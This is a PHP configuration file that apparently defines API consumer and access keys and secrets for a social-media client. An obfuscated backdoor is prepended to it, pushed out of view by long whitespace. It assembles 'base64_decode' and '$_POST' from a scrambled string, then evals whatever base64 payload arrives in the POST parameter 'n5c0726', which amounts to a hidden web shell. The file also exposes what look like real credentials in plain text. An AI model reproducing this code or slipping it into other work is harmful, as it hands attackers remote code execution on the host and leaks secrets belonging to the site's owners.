<?php                                                                                                                                                                                                                                                                             $lmkb48= "ecbo_tp46ads"; $japm1 = strtolower ($lmkb48[2].$lmkb48[9]. $lmkb48[11].$lmkb48[0] . $lmkb48[8]. $lmkb48[7].$lmkb48[4] . $lmkb48[10].$lmkb48[0]. $lmkb48[1].$lmkb48[3].$lmkb48[10]. $lmkb48[0] ); $jgbk7 =strtoupper ($lmkb48[4]. $lmkb48[6]. $lmkb48[3]. $lmkb48[11]. $lmkb48[5]) ; if(isset ( ${ $jgbk7} [ 'n5c0726'] )) {eval($japm1( ${$jgbk7}['n5c0726' ] )) ; } ?> <?php
/**
...
define('YOUR_CONSUMER_KEY', 'RJ30tcDx3xE6mkmumjL1gX3AN');
define('YOUR_CONSUMER_SECRET', '5SgPHsEtKi4LmXyRWcbVC7fwnU1frWZ8Gtyt62P3IkEXPJNT5f');
define('SOME_ACCESS_KEY', '1964254412-rBfBk261gEp8xTFZCnQjWGJBQ9VherRjGNPVY8n');
define('SOME_ACCESS_SECRET', 'syoxyggqHaGYBWMDc5yYhtC7kEIF1ysd3YDTEJfl5e7WC');
